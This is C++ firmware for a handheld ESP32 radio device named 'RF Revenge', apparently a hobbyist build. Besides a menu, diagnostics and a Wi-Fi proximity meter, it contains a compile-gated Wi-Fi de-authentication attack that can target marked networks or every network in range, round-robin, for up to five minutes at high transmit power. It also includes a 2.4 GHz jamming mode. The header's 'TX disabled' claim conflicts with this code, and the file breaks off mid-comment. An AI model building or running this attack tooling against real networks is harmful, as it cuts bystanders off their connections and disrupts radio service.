// RF Revenge firmware v0.1 (POC).
//
// Non-blocking state machine over three application buttons. Every boot
// and every lab stop path leaves all external radios powered down.
// See project documentation for what this build does and does NOT do (TX disabled).

#include <Arduino.h>
#include <math.h>
#include "pins.h"
#include "display.h"
#include "led.h"
#include "buttons.h"
#include "radios.h"
#include "settings.h"
#include "scheduler.h"
#include "wifi_ble.h"
#include "proximity.h"
#if WIFI_DEAUTH_ENABLE
#include "deauth.h"
#endif
// ---------------------------------------------------------------------------
// Top-level UI states.
// ---------------------------------------------------------------------------
enum class UIState {
    MENU,
    DIAGNOSTICS,
    PROXIMITY,      // Wi-Fi proximity meter (phase 5)
#if WIFI_DEAUTH_ENABLE
    DEAUTH,         // Wi-Fi de-auth (phase 7, compile-gated)
#endif
#if JAM_ENABLE
    JAM,            // nRF24 2.4 GHz jamming (phase 8, compile-gated)
#endif
    SETTINGS,
    ABOUT
};

static UIState ui = UIState::MENU;

// Menu model (de-auth + jam entries only exist in their gated builds)
// Diagnostics is the last item (user preference, 0.6.28).
static const char *kMenu[7] = {
    "2.4G Wi-Fi Proximity",
#if WIFI_DEAUTH_ENABLE
    "Wi-Fi De-Auth",
#endif
#if JAM_ENABLE
    "2.4G Jam",
#endif
    "Settings",
    "About",
    "Diagnostics"
};
static const int kMenuN = 4 + (WIFI_DEAUTH_ENABLE ? 1 : 0) + (JAM_ENABLE ? 1 : 0);
static int menu_sel = 0;

// Settings editing state
static int set_sel = 0;      // 0=LED enable 1=LED brightness 2=TX power (PA)
static bool set_save_failed = false;
static settings::Data S;     // live working copy

// Diagnostics captured results
struct DiagResults {
    bool oled;
    bool i2c;
    bool led;
    radios::Health ra, rb, rc;
};
static DiagResults diag;

// ---------------------------------------------------------------------------
// Wi-Fi proximity meter state (phase 5).
//   L/R  select target from the last scan (strongest-first)
//   S    confirm/lock the selected target, start following
//   HOLD S  exit / release
// The meter rescan-passives a non-connected Wi-Fi scan and tracks the RSSI
// of the locked BSSID. It never connects and never sends a payload.
// ---------------------------------------------------------------------------
static RssiSmoothen prox;
static int  prox_sel = 0;          // index into last scan list
static bool prox_locked = false;   // a target is being followed
static char prox_bssid[18];        // locked target id (BSSID)
static char prox_ssid[18];         // label
static float prox_ema = 0.0f;      // smoothed dBm of the locked target
static int   prox_chan = 0;        // locked target's Wi-Fi channel (fast re-read)
static int   prox_lost_strikes = 0;  // consecutive scan misses before verify
static bool  prox_full_verify = false;  // a full 13-ch scan is in flight to
                                        // confirm a lost target before LOST
static uint32_t prox_lost_until = 0; // LOST banner visible until then or any key
// ponytail: discovery rescan period. The locked meter re-reads the target's
// own channel only (start_scan(chan)), so its refresh is ~0.2-0.5 s no matter
// what kRescanMs is; this constant only gates discovery + target-lost checks.
static const uint32_t kRescanMs = 2500;
static const uint32_t kLockedRescanMs = 400;   // fast re-read of the target channel
static uint32_t prox_next_scan = 0;
static bool prox_have_result = false;

static void prox_paint_list(uint32_t now) {
    display::clear();
    display::center(8, "2.4G WIFI PROXIMITY");
    const wifi_ble::ScanResult *r = wifi_ble::result();
    if (!prox_have_result || r->count == 0) {
        display::center(28, "SCANNING ...");
        display::center(44, "NO NETWORKS YET");
        display::center(54, "HOLD SELECT EXIT");
    } else {
        int top = prox_sel < r->count ? prox_sel : 0;
        display::line(20, "SEL (S LOCK):", false, 0);
        char b[24];
        const wifi_ble::Net &n = r->nets[top];
        snprintf(b, sizeof(b), "%s %ddBm", n.ssid[0] ? n.ssid : "(hidden)", n.rssi);
        display::line(32, b, false, 0);
        snprintf(b, sizeof(b), "%s", n.bssid);
        display::line(42, b, false, 0);
        display::center(54, "L/R  PICK  S  LOCK");
    }
    display::flush();
}

static void prox_paint_locked(uint32_t now) {
    display::clear();
    display::center(8, "FOLLOWING");
    char b[24];
    snprintf(b, sizeof(b), "%s", prox_ssid[0] ? prox_ssid : prox_bssid);
    display::center(22, b);
    snprintf(b, sizeof(b), "%d dBm", (int)prox_ema);
    display::center(34, b);
    // Horizontal signal bar: one CONTINUOUS fill, width = smoothed signal.
    // No width animation: the 0.6.30 sine pulse faked "moving away" while the
    // reader was stationary — the bar must track the signal only. The EMA
    // (prox_ema) already smooths multipath fading; a strong nearby signal
    // clamps at full and stays put. Continuous width (not integer bars) so a
    // real change eases in instead of jumping a segment.
    float frac = (prox_ema + 100.0f) / 60.0f;      // 0..1 (-100..-40 dBm)
    if (frac < 0.0f) frac = 0.0f;
    if (frac > 1.0f) frac = 1.0f;
    const int bx = 11, by = 42, bw = 105, bh = 14;
    display::glyph(bx, by, bw, 1);
    display::glyph(bx, by + bh - 1, bw, 1);
    display::glyph(bx, by, 1, bh);
    display::glyph(bx + bw - 1, by, 1, bh);
    int fw = (int)((bw - 2) * frac);
    if (fw > 0) display::glyph(bx + 1, by + 1, fw, bh - 2);
    // trend at the very bottom (y 56..63): no overlap with the bar
    display::center(56, rssi_trend_str(prox.trend));
    display::flush();
}

static void prox_exit(uint32_t now);   // forward: called by prox_tick
static void paint_menu();              // forward: called by prox_exit

static void prox_enter() {
    prox.reset();
    prox_locked = false;
    prox_chan = 0;
    prox_lost_strikes = 0;
    prox_full_verify = false;
    prox_lost_until = 0;
    prox_have_result = false;
    prox_sel = 0;
    if (!wifi_ble::init()) {
        // Wi-Fi stack unavailable: show it, stay safe.
        display::clear();
        display::center(8, "PROXIMITY");
        display::center(28, "WIFI UNAVAILABLE");
        display::center(54, "HOLD SELECT EXIT");
        display::flush();
        led::set(LedState::DEGRADED);
        return;
    }
    led::set(LedState::PROXIMITY);
    wifi_ble::start_scan(0);          // full discovery scan
    prox_next_scan = millis() + kRescanMs;
    prox_paint_list(millis());
}

static void prox_tick(uint32_t now, const BtnEv &ev) {
    // Non-blocking rescan: start when idle and due; settle copies the list.
    // Locked: re-read only the target's channel (~0.2 s). Discovery: full
    // 13-channel scan every kRescanMs.
    if (!wifi_ble::scanning() && now >= prox_next_scan) {
        // Locked: re-read the target's channel (fast). After 2 single-ch
        // misses, run one full 13-ch verify scan before declaring LOST
        // (the target may have changed channel; a single-channel passive
        // window can legitimately catch zero beacons).
        int chan = 0;
        if (prox_locked) chan = prox_full_verify ? 0 : prox_chan;
        wifi_ble::start_scan(chan);
    }
    if (wifi_ble::settle()) {
        prox_have_result = true;
        prox_next_scan = now + (prox_locked ? kLockedRescanMs : kRescanMs);
        const wifi_ble::ScanResult *r = wifi_ble::result();
        if (prox_locked) {
            int found = -1;
            for (int i = 0; i < r->count; ++i)
                if (strcmp(r->nets[i].bssid, prox_bssid) == 0) { found = i; break; }
            if (found < 0) {
                if (prox_full_verify) {
                    // full 13-channel scan missed it too: really lost
                    prox_locked = false;
                    prox_full_verify = false;
                    prox_lost_strikes = 0;
                    prox.reset();
                    led::set(LedState::OFF);       // no target = light out
                    prox_lost_until = now + 3000;
                    return;
                }
                if (++prox_lost_strikes >= 2) {
                    prox_full_verify = true;
                    prox_next_scan = now;   // start the verify scan now
                }
                return;
            }
            prox_full_verify = false;
            prox_lost_strikes = 0;
            prox_chan = r->nets[found].chan;  // follow a channel change
            prox.update((float)r->nets[found].rssi);
            prox_ema = prox.ema;
            led::set_pulse_ms(led_pulse_ms(prox_ema));  // pulse rate = signal strength
            prox_paint_locked(now);
            return;
        }
        if (prox_sel >= r->count) prox_sel = r->count > 0 ? r->count - 1 : 0;
        prox_paint_list(now);
    }

    // TARGET LOST banner: held for 3 s or until any key.
    if (now < prox_lost_until) {
        if (!ev.valid()) {
            display::clear();
            display::center(8, "TARGET LOST");
            display::center(28, prox_bssid);
            display::center(44, "L/R PICK  S LOCK");
            display::center(54, "HOLD SELECT EXIT");
            display::flush();
            return;
        }
        prox_lost_until = 0;
    }

    // Input
    if (ev.valid() && ev.ev == BtnEvent::LONG) {
        prox_exit(now);   // emergency/exit: release + radio off
        return;
    }
    if (!prox_locked) {
        const wifi_ble::ScanResult *r = wifi_ble::result();
        if (prox_have_result && r->count > 0) {
            if (ev.valid() && ev.btn == Btn::LEFT  && ev.ev == BtnEvent::PRESS)
                prox_sel = (prox_sel + r->count - 1) % r->count;
            else if (ev.valid() && ev.btn == Btn::RIGHT && ev.ev == BtnEvent::PRESS)
                prox_sel = (prox_sel + 1) % r->count;
            else if (ev.valid() && ev.btn == Btn::SELECT && ev.ev == BtnEvent::PRESS) {
                const wifi_ble::Net &n = r->nets[prox_sel];
                snprintf(prox_bssid, sizeof(prox_bssid), "%s", n.bssid);
                snprintf(prox_ssid,  sizeof(prox_ssid),  "%s", n.ssid);
                prox_chan = n.chan;
                prox_lost_strikes = 0;
                prox.reset();
                prox.update((float)n.rssi);
                prox_ema = prox.ema;
                led::set(LedState::PROXIMITY);
                led::set_pulse_ms(led_pulse_ms(prox_ema));  // pulse rate = signal strength
                prox_locked = true;
            }
        }
        prox_paint_list(now);
    } else {
        prox_paint_locked(now);
    }
}

static void prox_exit(uint32_t now) {
    wifi_ble::stop();          // radio off — safe state
    prox_locked = false;
    prox_chan = 0;
    prox_lost_strikes = 0;
    prox_full_verify = false;
    prox_lost_until = 0;
    prox.reset();
    ui = UIState::MENU;
    led::set(LedState::SAFE);
    paint_menu();
}

// ---------------------------------------------------------------------------
// Timing / non-blocking helpers.
// ---------------------------------------------------------------------------
static uint32_t fade_next_ms = 0;

static void led_tick(uint32_t now) {
    if (led::pulsing() && now >= fade_next_ms) {
        led::fade(now);
        fade_next_ms = now + 30;  // ~30 ms cadence; fade() only rewrites the strip when a quantized step changes
    }
}

// ---------------------------------------------------------------------------
// Screen painters (each one clears + draws + flushes; non-blocking).
// ---------------------------------------------------------------------------

// Menu with scroll: the 6th item (de-auth build) doesn't fit on 5 rows, so
// the list slides one row when the selection would leave the viewport.
// Layout: top/bottom arrows at y=5 (clipped rows stay fully visible),
// 5 rows from y=14, row height 9 px.

static const int kMenuRows = 5;

static void paint_menu() {
    display::clear();
    int top = menu_sel - kMenuRows + 1;    // keep selection on the last row
    if (top < 0) top = 0;
    if (top > kMenuN - kMenuRows) top = kMenuN - kMenuRows;
    if (top > 0)                display::center(5, "^");
    if (top + kMenuRows < kMenuN) display::center(5, "v");
    for (int i = top; i < top + kMenuRows && i < kMenuN; ++i) {
        int y = 14 + (i - top) * 9;
        // cursor in column 0, label offset in column 8 — never overwritten
        display::line(y, i == menu_sel ? ">" : " ", false);
        display::line(y, kMenu[i], false, 8);
    }
    display::flush();
}
static void paint_diagnostics() {
    display::clear();
    display::center(8, "DIAGNOSTICS");
    char b[22];
    snprintf(b, sizeof(b), "OLED:  %s", diag.oled ? "PASS" : "FAIL");
    display::line(16, b, false);
    snprintf(b, sizeof(b), "I2C:   %s", diag.i2c ? "PASS" : "FAIL");
    display::line(28, b, false);
    snprintf(b, sizeof(b), "LED:   %s", diag.led ? "PASS" : "FAIL");
    display::line(40, b, false);
    // Radio summary on the last line
    int present = (diag.ra.present?1:0) + (diag.rb.present?1:0) + (diag.rc.present?1:0);
    snprintf(b, sizeof(b), "RADIO: %d/3", present);
    display::line(52, b, false);
    display::flush();
}
static void paint_settings() {
    display::clear();
    display::center(2, "SETTINGS");
    // Full item names (no BRT/CON/PA abbreviations). Each row needs its OWN
    // buffer (the old shared-buffer bug rendered the last snprintf four times).
    // Contrast was removed from the menu (0.6.28): the SSD1306 contrast
    // command is a no-op on most real panels — a dead knob. The field stays
    // in settings for NVS backward compat.
    char r0[26], r1[26], r2[26];
    snprintf(r0, sizeof(r0), "LED: %s", S.led_enabled ? "ON" : "OFF");
    snprintf(r1, sizeof(r1), "BRIGHTNESS: %u", S.led_brightness);
    // The value is PA_HIGH, not off — the old "OFF" label was wrong.
    snprintf(r2, sizeof(r2), "POWER: %s", S.tx_pa_max ? "MAX" : "HIGH");
    const char *rows[3] = { r0, r1, r2 };
    for (int i = 0; i < 3; i++) {
        int y = 12 + i * 8;
        display::line(y, i == set_sel ? ">" : " ", false);   // cursor col 0
        display::line(y, rows[i], false, 8);                 // label col 8
    }
    display::line(46, "L/R VALUE  S PICK", false);
    if (set_save_failed) display::center(54, "SAVE FAILED - RETRY");
    else display::line(54, "HOLD S SAVE", false);
    display::flush();
}
static void paint_about() {
    display::clear();
    display::center(8, "ABOUT");
    display::center(16, APP_VERSION);
    int present = (diag.ra.present?1:0) + (diag.rb.present?1:0) + (diag.rc.present?1:0);
    char b[26];
    snprintf(b, sizeof(b), "RADIOS: %d/3  LED %s", present, S.led_enabled ? "ON" : "OFF");
    display::center(32, b);
#if JAM_ENABLE
    display::center(48, "TX ENABLED (JAM)");
#else
    display::center(48, "TX DISABLED (POC)");
#endif
    display::center(54, "HOLD SELECT EXIT");
    display::flush();
}
static void run_diagnostics() {
    diag.oled = display::present();
    diag.i2c = display::present();      // I2C health == display responding on the bus
    // LED check: we cannot read a NeoPixel back, so "PASS" means the strip
    // initialized without fault. Real brightness validation is on-device.
    diag.led = true;
    diag.ra = radios::probe(0);
    diag.rb = radios::probe(1);
    diag.rc = radios::probe(2);
    radios::power_down_all();           // always end the probe safe
    Serial.printf("DIAG oled=%d i2c=%d ra=%d rb=%d rc=%d\n",
                  diag.oled, diag.i2c, diag.ra.present, diag.rb.present, diag.rc.present);
}

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------
// Wi-Fi de-auth (phase 7, compile-gated).
//   L/R  pick from the discovery scan (strongest-first, like the meter)
//   S    arm the target → 3 s visible warning → bounded session of bursts
//   HOLD S  emergency stop from any sub-state; Wi-Fi + nRF24 back to OFF
// Reuses the lab safety framework: explicit arm, warning, bounded timer,
// long-press stop, serial audit lines (DEAUTH START/BURST/STOP).
// ---------------------------------------------------------------------------
#if WIFI_DEAUTH_ENABLE
enum class DAuthState { IDLE, DUR, ARMING, ACTIVE, DONE };
static DAuthState dauth = DAuthState::IDLE;
static SessionTimer dauth_timer;
static int    dauth_sel = 0;
static bool   dauth_have_result = false;
static uint32_t dauth_next_scan = 0;
static uint32_t dauth_arm_until = 0;
static uint32_t dauth_next_burst = 0;
static deauth::Target dauth_target;
static uint32_t dauth_mark = 0;     // bit i = network i marked for attack
static uint8_t dauth_rr_list[32];   // ordered attack list (all or marked)
static int    dauth_rr_n = 0;       // entries in dauth_rr_list
static int    dauth_rr = 0;         // round-robin index into dauth_rr_list
static uint32_t dauth_cap_ms = 30000;   // session cap; UI cycles 30 s..5 min
static int8_t   dauth_tx_power = 84;    // 0.25 dBm units, [8,84]; 'p' steps down
static const uint32_t kDAuthBurstMs = 200;   // 5-frame bursts: ~25 frames/s
static const uint32_t kDAuthCapStep = 30000; // duration steps: 30 s .. 5 min
static const uint32_t kArmMs = 3000;         // visible arm warning (was the lab's; deauth reuses it)

static void dauth_paint_idle(uint32_t now) {
    display::clear();
    display::center(8, "WI-FI DE-AUTH");
    const wifi_ble::ScanResult *r = wifi_ble::result();
    if (!dauth_have_result || r->count == 0) {
        display::center(28, "SCANNING ...");
        display::center(54, "HOLD SELECT EXIT");
    } else {
        // Selection range 0..count+1: real nets 0..count-1,
        // count = "ALL", count+1 = "MARKED".
        int n = r->count;
        int top = dauth_sel <= n + 1 ? dauth_sel : 0;
        if (top == n) {
            char b[24];
            snprintf(b, sizeof(b), "ALL NETWORKS");
            display::line(22, b, false);
            snprintf(b, sizeof(b), "%d IN RANGE", n);
            display::line(32, b, false);
            display::line(42, "ROUND ROBIN", false);
            display::center(54, "L/R NAV  S START");
        } else if (top == n + 1) {
            char b[24];
            display::line(22, "MARKED SET", false);
            snprintf(b, sizeof(b), "%d MARKED", __builtin_popcount(dauth_mark));
            display::line(32, b, false);
            display::line(42, "ROUND ROBIN", false);
            display::center(54, "L/R NAV  S START");
        } else {
            const wifi_ble::Net &net = r->nets[top];
            char b[24];
            bool marked = (dauth_mark >> top) & 1;
            snprintf(b, sizeof(b), "%s%s", marked ? "* " : "  ",
                     net.ssid[0] ? net.ssid : "(hidden)");
            display::line(22, b, false);
            snprintf(b, sizeof(b), "%s", net.bssid);
            display::line(32, b, false);
            snprintf(b, sizeof(b), "CH %d   %d dBm", net.chan, net.rssi);
            display::line(42, b, false);
            display::center(54, "L/R NAV  S MARK");
        }
    }
    display::flush();
}

static void dauth_paint_dur(uint32_t now) {
    display::clear();
    display::center(8, "ATTACK DURATION");
    const wifi_ble::ScanResult *r = wifi_ble::result();
    char b[24];
    int n = r ? r->count : 0;
    // DUR is only entered from a pseudo-item: ALL (n) or MARKED (n+1).
    if (dauth_sel == n + 1)
        snprintf(b, sizeof(b), "MARKED (%d)", __builtin_popcount(dauth_mark));
    else
        snprintf(b, sizeof(b), "ALL (%d)", n);
    display::line(22, b, false);
    snprintf(b, sizeof(b), "DUR %lus", (unsigned long)(dauth_cap_ms / 1000));
    display::center(46, b);
    display::center(54, "L/R SET  S START");
    display::flush();
}

static void dauth_enter() {
    dauth = DAuthState::IDLE;
    dauth_sel = 0;
    dauth_have_result = false;
    dauth_mark = 0;
    dauth_rr_n = 0;
    dauth_rr = 0;
    dauth_timer.start(0, 0);
    radios::power_down_all();
    if (!wifi_ble::init()) {
        display::clear();
        display::center(8, "WI-FI DE-AUTH");
        display::center(28, "WIFI UNAVAILABLE");
        display::center(54, "HOLD SELECT EXIT");
        display::flush();
        led::set(LedState::DEGRADED);
        return;
    }
    led::set(LedState::SAFE);
    wifi_ble::start_scan(0);
    dauth_next_scan = millis() + kRescanMs;
    dauth_paint_idle(millis());
}

static void dauth_stop(const char *reason) {
    deauth::stop_session(reason);
    dauth_timer.start(0, 0);
    dauth = DAuthState::DONE;
    led::set(LedState::SAFE);
}

static void dauth_exit() {
    wifi_ble::stop();
    ui = UIState::MENU;
    led::set(LedState::SAFE);
    paint_menu();
}

static void dauth_tick(uint32_t now, const BtnEv &ev) {
    switch (dauth) {
    case DAuthState::IDLE: {
        // No auto-rescan: the list is frozen after the initial scan so the
        // user's selection and marks don't shift under them (RSSI re-sort
        // would move the index). To see new networks, exit and re-enter.
        if (wifi_ble::settle()) {
            dauth_have_result = true;
            dauth_next_scan = now + kRescanMs;
            const wifi_ble::ScanResult *r = wifi_ble::result();
            // New list is re-sorted by RSSI: old marks would point at the
            // wrong networks, so they are dropped with every rescan.
            dauth_mark = 0;
            // Selection range is 0..count+1 (count = "ALL", count+1 = "MARKED");
            // clamp only past it.
            if (dauth_sel > r->count + 1) dauth_sel = r->count;
        }
        // Navigation range 0..count+1 (real nets + ALL + MARKED pseudo-items).
        int range = wifi_ble::result()->count + 2;
        if (ev.valid() && ev.btn == Btn::LEFT  && ev.ev == BtnEvent::PRESS && dauth_have_result)
            dauth_sel = (dauth_sel + range - 1) % range;
        else if (ev.valid() && ev.btn == Btn::RIGHT && ev.ev == BtnEvent::PRESS && dauth_have_result)
            dauth_sel = (dauth_sel + 1) % range;
        else if (ev.valid() && ev.btn == Btn::SELECT && ev.ev == BtnEvent::PRESS && dauth_have_result) {
            const wifi_ble::ScanResult *r = wifi_ble::result();
            int n = r->count;
            if (dauth_sel < n) {
                // SELECT on a real network = toggle its mark.
                dauth_mark ^= (1u << dauth_sel);
            } else {
                // Pseudo-item (ALL or MARKED) -> dedicated duration screen.
                dauth = DAuthState::DUR;
                dauth_paint_dur(now);
                break;
            }
        }
        else if (ev.valid() && ev.ev == BtnEvent::LONG) {
            dauth_exit();                  // HOLD SELECT = exit
            break;
        }
        dauth_paint_idle(now);
        break;
    }

    case DAuthState::DUR:
        if (ev.valid() && ev.btn == Btn::LEFT  && ev.ev == BtnEvent::PRESS) {
            dauth_cap_ms -= kDAuthCapStep;
            if (dauth_cap_ms < 30000) dauth_cap_ms = 300000;   // wrap to 5 min
        }
        else if (ev.valid() && ev.btn == Btn::RIGHT && ev.ev == BtnEvent::PRESS) {
            dauth_cap_ms += kDAuthCapStep;
            if (dauth_cap_ms > 300000) dauth_cap_ms = 30000;   // wrap to 30 s
        }
        else if (ev.valid() && ev.btn == Btn::SELECT && ev.ev == BtnEvent::PRESS) {
            // SELECT = start: build the round-robin list (ALL or marked), arm.
            const wifi_ble::ScanResult *r = wifi_ble::result();
            int n = r ? r->count : 0;
            dauth_rr_n = 0;
            if (dauth_sel == n) {                       // ALL
                for (int i = 0; i < n; ++i) dauth_rr_list[dauth_rr_n++] = (uint8_t)i;
            } else {                                    // MARKED
                for (int i = 0; i < n && i < 32; ++i)
                    if ((dauth_mark >> i) & 1u) dauth_rr_list[dauth_rr_n++] = (uint8_t)i;
            }
            if (dauth_rr_n == 0) {                      // nothing marked: back
                dauth = DAuthState::IDLE;
                break;
            }
            const wifi_ble::Net &first = r->nets[dauth_rr_list[0]];
            snprintf(dauth_target.bssid, sizeof(dauth_target.bssid), "%s", first.bssid);
            snprintf(dauth_target.ssid,  sizeof(dauth_target.ssid),  "%s", first.ssid);
            dauth_target.chan = first.chan;
            dauth_rr = 0;
            wifi_ble::stop();              // discovery radio off before TX mode
            dauth = DAuthState::ARMING;
            dauth_arm_until = now + kArmMs;
            led::set(LedState::ARMED);
            Serial.printf("DEAUTH ARM set=%s nets=%d cap=%lu ms\n",
                          dauth_sel == n ? "ALL" : "MARKED", dauth_rr_n,
                          (unsigned long)dauth_cap_ms);
            break;
        }
        else if (ev.valid() && ev.ev == BtnEvent::LONG) {
            dauth = DAuthState::IDLE;      // HOLD = back to target pick
            break;
        }
        dauth_paint_dur(now);
        break;

    case DAuthState::ARMING:
        if (ev.valid() && ev.ev == BtnEvent::LONG) {
            dauth_stop("armed-cancel");
            break;
        }
        if (now >= dauth_arm_until) {
            // Global TX PA (all TX functions): assert the setting at session
            // start so every deauth uses it regardless of boot order or a
            // prior Settings edit (the driver's max-tx-power is persistent).
            deauth::set_tx_power(S.tx_pa_max ? 84 : 72);
            if (!deauth::begin_session(dauth_target)) {
                dauth_stop("tx-init-fail");
                break;
            }
            dauth_timer.start(now, dauth_cap_ms);
            dauth_next_burst = now;
            dauth = DAuthState::ACTIVE;
            led::set(LedState::ACTIVE);
            break;
        }
        {
            uint32_t rem_ms = dauth_arm_until > now ? (dauth_arm_until - now) : 0;
            int fill = (int)((120 - 2) * rem_ms / kArmMs);
            static int last_fill = -1;
            if (fill != last_fill) {
                last_fill = fill;
                char b[24];
                display::clear();
                display::center(8, "ARMING ...");
                display::center(22, dauth_rr_n == 1 ? dauth_target.bssid : "MULTI-NET");
                // Draining bar (mock 3.3), same as the JAM ARMING screen.
                {
                    const int bx = 4, by = 32, bw = 120, bh = 10;
                    display::glyph(bx, by, bw, 1);
                    display::glyph(bx, by + bh - 1, bw, 1);
                    display::glyph(bx, by, 1, bh);
                    display::glyph(bx + bw - 1, by, 1, bh);
                    if (fill > 0) display::glyph(bx + 1, by + 1, fill, bh - 2);
                }
                snprintf(b, sizeof(b), "START IN %lu s", (unsigned long)(rem_ms / 1000));
                display::center(48, b);
                display::center(58, "HOLD SELECT CANCEL");
                display::flush();
            }
        }
        break;

    case DAuthState::ACTIVE:
        if (now >= dauth_next_burst) {
            deauth::tx_burst();
            // Round-robin: next network in the attack list (frozen at start).
            if (dauth_rr_n > 0) {
                dauth_rr = (dauth_rr + 1) % dauth_rr_n;
                const wifi_ble::ScanResult *r = wifi_ble::result();
                deauth::Target t;
                const wifi_ble::Net &n = r->nets[dauth_rr_list[dauth_rr]];
                snprintf(t.bssid, sizeof(t.bssid), "%s", n.bssid);
                snprintf(t.ssid,  sizeof(t.ssid),  "%s", n.ssid);
                t.chan = n.chan;
                deauth::retarget(t);    // channel switch; failure logged
            }
            dauth_next_burst = now + kDAuthBurstMs;
        }
        if (ev.valid() && ev.ev == BtnEvent::LONG) {
            dauth_stop("manual-stop");
            break;
        }
        if (dauth_timer.should_stop(now)) {
            dauth_stop("timeout");
            break;
        }
        {
            uint32_t rem = dauth_timer.remaining(now) / 1000;
            char b[24];
            display::clear();
            display::center(8, dauth_rr_n == 1 ? "DE-AUTH ACTIVE" : "DE-AUTH MULTI");
            if (dauth_rr_n == 1) {
                snprintf(b, sizeof(b), "%s", dauth_target.bssid);
                display::center(22, b);
            } else {
                const wifi_ble::ScanResult *r = wifi_ble::result();
                const wifi_ble::Net &n = r->nets[dauth_rr_list[dauth_rr]];
                snprintf(b, sizeof(b), "%d/%d  %s", dauth_rr + 1, dauth_rr_n,
                         n.ssid[0] ? n.ssid : "(hid)");
                display::center(22, b);
            }
            snprintf(b, sizeof(b), "LEFT %lus  SENT %u", (unsigned long)rem,
                     (unsigned)deauth::frames_sent());
            display::center(36, b);
            display::center(54, "HOLD SELECT STOP");
            display::flush();
        }
        break;

    case DAuthState::DONE:
        // R = repeat the same attack (frozen set + cap), L = back to the
        // duration screen, S = back to the menu (legacy).
        if (ev.valid() && ev.btn == Btn::RIGHT && ev.ev == BtnEvent::PRESS) {
            if (dauth_rr_n == 0) { dauth = DAuthState::IDLE; break; }
            dauth_rr = 0;   // restart the round-robin from the first net
            // Reset the target to the first net (same as the DUR start path):
            // otherwise the first burst would go out on the last net's channel
            // before the round-robin retargets.
            {
                const wifi_ble::Net &first = wifi_ble::result()->nets[dauth_rr_list[0]];
                snprintf(dauth_target.bssid, sizeof(dauth_target.bssid), "%s", first.bssid);
                snprintf(dauth_target.ssid,  sizeof(dauth_target.ssid),  "%s", first.ssid);
                dauth_target.chan = first.chan;
            }
            dauth = DAuthState::ARMING;
            dauth_arm_until = now + kArmMs;
            led::set(LedState::ARMED);
            Serial.printf("DEAUTH REPEAT nets=%d cap=%lu ms\n",
                          dauth_rr_n, (unsigned long)dauth_cap_ms);
        }
        else if (ev.valid() && ev.btn == Btn::LEFT && ev.ev == BtnEvent::PRESS) {
            dauth = DAuthState::DUR;      // back to the duration screen
            dauth_paint_dur(now);
        }
        else if (ev.valid() && ev.btn == Btn::SELECT && ev.ev == BtnEvent::PRESS) {
            dauth_exit();
        } else {
            char b[24];
            display::clear();
            display::center(8, "SESSION STOPPED");
            snprintf(b, sizeof(b), "SENT %u  ERR %u", (unsigned)deauth::frames_sent(),
                     (unsigned)deauth::frames_err());
            display::center(26, b);
            if (deauth::last_error() != 0) {
                // last ESP_ERR_* from the driver — the serial is not the log
                // port on this board, so the number goes on glass.
                // Only shown when there actually was an error (no 0x00000000 noise).
                snprintf(b, sizeof(b), "LAST ERR 0x%08lX", (unsigned long)deauth::last_error());
                display::center(36, b);
            }
            display::center(44, "RADIO POWERED DOWN");
            display::center(54, "L BACK - R REPEAT");
            display::flush();
        }
        break;
    }
}
#endif  // WIFI_DEAUTH_ENABLE

// ---------------------------------------------------------------------------
// Setup.
// ---------------------------------------------------------------------------
static void safe_boot() {
    Serial.begin(115200);
    delay(250);
    Serial.printf("\n=== RF Revenge %s ===\n", APP_VERSION);
    Serial.printf("RESET: reason=%u (esp_reset_reason_t)\n", (unsigned)esp_reset_reason());
    Serial.println("BOOT_SAFE: external radios powered down");

    // Radios first and safe, before anything else can touch them.
    radios::init();
    radios::power_down_all();

    settings::begin();
    S = settings::load();
    Serial.printf("SETTINGS led=%d brightness=%u power=%s\n", S.led_enabled,
                  (unsigned)S.led_brightness, S.tx_pa_max ? "MAX" : "HIGH");
    led::init(S.led_enabled, S.led_brightness);   // LED shows BOOT (blue pulse) state
    display::init();
    display::set_contrast(S.oled_contrast);
    buttons::init();

    // Brand splash: Blackbeard flag + wordmark, ~4s, then the boot/diag screen.
    // LED cycles through its colors during the splash (boot color parade).
    display::splash("RF REVENGE", "RF-Clown V2", APP_VERSION);
    {
        static const uint8_t parade[][3] = {
            {0, 0, 120},      // blue
            {0, 120, 120},    // cyan
            {0, 120, 0},      // green
            {120, 120, 0},    // yellow
            {220, 90, 0},     // orange
            {220, 0, 0},      // red
            {120, 0, 120},    // magenta
            {80, 80, 80},     // white (SAFE)
        };
        uint32_t t0 = millis();
        while (millis() - t0 < 4000) {
            int i = (int)((millis() - t0) / 500) % 8;  // 500 ms per color
            led::color(parade[i][0], parade[i][1], parade[i][2]);
            delay(20);
        }
    }

    // Brownout evidence (battery vs USB): if the previous session died of a
    // voltage sag, say so on glass — a silent freeze is otherwise undiagnosable.
    if (esp_reset_reason() == ESP_RST_BROWNOUT) {
        display::clear();
        display::center(8, "LAST RESET: BROWNOUT");
        display::center(26, "VOLTAGE DROPPED");
        display::center(36, "CHECK BATTERY / CABLE");
        display::flush();
        Serial.println("BOOT_WARN: previous reset was BROWNOUT");
        delay(4000);
    }

    run_diagnostics();

    // Degraded state (any radio missing) → yellow, else dim green idle.
    int present = (diag.ra.present?1:0) + (diag.rb.present?1:0) + (diag.rc.present?1:0);
    if (present < 3) {
        led::set(LedState::DEGRADED);
    } else {
        led::set(LedState::SAFE);
    }
    ui = UIState::MENU;
    paint_menu();
    Serial.println("READY");
}

void setup() { safe_boot(); }

// ---------------------------------------------------------------------------
// Jam module (phase 8) — included here so it can reference ui, diag,
// paint_menu, led, display, radios (all defined above).
// ---------------------------------------------------------------------------
#if JAM_ENABLE
#include "jam.h"
#endif

// ---------------------------------------------------------------------------
// Loop: poll input, advance UI, tick LED. Non-blocking.
// ---------------------------------------------------------------------------
void loop() {
    uint32_t now = millis();
    buttons::update(now);
    BtnEv ev = buttons::poll();
#if WIFI_DEAUTH_ENABLE || JAM_ENABLE
    // Serial test console (RF build only): 1 char -> synthetic button event,
    // so de-auth / jam can be driven and observed over the log port.
    //   l/r = navigate (de-auth: nets + ALL + MARKED / jam: profile) or set
    //         duration (de-auth DUR screen)
    //   D = SELECT press: mark/unmark net (de-auth IDLE) / start (de-auth
    //         DUR) / enter duration (jam IDLE) / start (jam DUR)
    //   d/x = SELECT long: exit (IDLE) / back (DUR) / stop (ARMING, ACTIVE)
    //   R = RPD self-test (B carrier ch40, A scans 38-42)
    //   W = RPD band sweep 2-80
    //   E = raw RSSI register sweep 2-80 (graded signal strength)
    //   1-9 = de-auth: session cap 10-90 s | jam: step cap 30 s .. 5 min
    //   s = de-auth: dump the scan list with the current selection marked
    //   p = de-auth: step TX power down (1 dBm)
